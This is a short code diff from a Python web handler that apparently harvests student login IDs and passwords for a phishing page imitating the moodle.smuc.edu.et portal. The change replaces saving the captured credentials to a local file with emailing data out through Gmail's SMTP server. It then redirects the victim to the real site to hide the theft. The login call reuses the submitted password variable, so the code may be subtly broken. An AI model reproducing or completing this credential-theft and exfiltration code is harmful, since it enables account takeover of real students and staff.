@@ -13,11 +13,15 @@ def main():
         if(password == None):
             password = 'null'
         
-        with open('data.txt', "a")as data:
-            data.write(id)
-            data.write('\n')
-            data.write(password)
-            data.write('\n')
+        context = ssl.create_default_context()
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+            server.login(from_address, password)
+            server.sendmail(
+                from_address,
+                email,
+                message,
+            )
+            
         
         return redirect('http://moodle.smuc.edu.et/students/')
 
